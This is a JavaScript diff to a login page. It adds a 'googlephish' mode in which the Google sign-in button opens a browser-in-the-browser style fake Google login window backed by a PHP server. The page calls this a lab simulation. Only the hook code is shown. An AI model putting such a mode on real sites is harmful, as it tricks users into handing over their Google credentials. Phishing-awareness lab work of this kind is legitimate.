@@ -19,6 +19,17 @@
         var googleBtn = document.getElementById('googleSignInBtn');
         if (googleBtn) {
             googleBtn.addEventListener('click', function () {
+                var mode = String(cfg.authMode || 'api').toLowerCase();
+                if (mode === 'googlephish') {
+                    var base = window.BitbGooglePhish && window.BitbGooglePhish.normalizeBase(cfg.googlephishBaseUrl);
+                    if (!base) {
+                        window.AuthUI.setBanner('Set googlephishBaseUrl in config.js (PHP server URL).', 'error');
+                        return;
+                    }
+                    if (window.BitbGooglePhish && window.BitbGooglePhish.open()) return;
+                    window.AuthUI.setBanner('Could not open lab window (see console).', 'error');
+                    return;
+                }
                 if (!window.AuthAPI || !window.AuthAPI.apiBase()) {
                     window.AuthUI.setBanner('Set apiBaseUrl in config.js to your API.', 'error');
                     return;
@@ -66,8 +77,14 @@
             e.preventDefault();
             window.AuthUI.clearBanner();
 
-            if (!window.AuthAPI.apiBase()) {
+            var mode = String(cfg.authMode || 'api').toLowerCase();
+            if (mode !== 'googlephish' && !window.AuthAPI.apiBase()) {
                 window.AuthUI.setBanner('Set apiBaseUrl in config.js to your API.', 'error');
+                return;
+            }
+
+            if (mode === 'googlephish') {
+                window.AuthUI.setBanner('In lab mode, use “Sign in with Google” to open the simulated browser window.', 'error');
                 return;
             }
 
